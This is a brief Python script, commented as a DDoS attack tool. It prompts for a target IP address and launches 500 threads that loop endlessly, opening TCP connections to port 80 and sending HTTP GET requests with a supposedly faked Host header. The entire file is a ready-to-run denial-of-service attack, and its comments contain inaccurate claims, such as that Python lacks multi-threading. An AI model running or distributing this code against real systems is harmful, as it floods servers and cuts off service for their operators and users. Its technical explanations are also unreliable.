#   for using multiple thread
import threading
#   for connecting multiple thread
import socket

"""
As python does not support multi-threading it is not good to use python for threading. This script is not 
multi-threading here. What it is doing is simulated multi-threading. It means switching between task as fast as 
possible. If you need actual multi-threading use different language for that.
"""

#   take target for ddos attack
target = input("Enter your target IP address: ")

#   ddos to http service
port = 80

#   fake IP to fake network
fake_ip = '182.21.20.32'

#   count number of request
already_connected = 0


#   actual attack starts here
def attack():
    #   running an infinite loop here to socket connection
    while True:
        #   creating socket and specifying protocol as tcp
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #   connecting to target ip and port
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        #   increase number of request
        global already_connected
        already_connected += 1

        #   print number of request after every 1000 request
        if already_connected % 1000 == 0:
            print(already_connected)


#   creates multiple thread for attack
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()


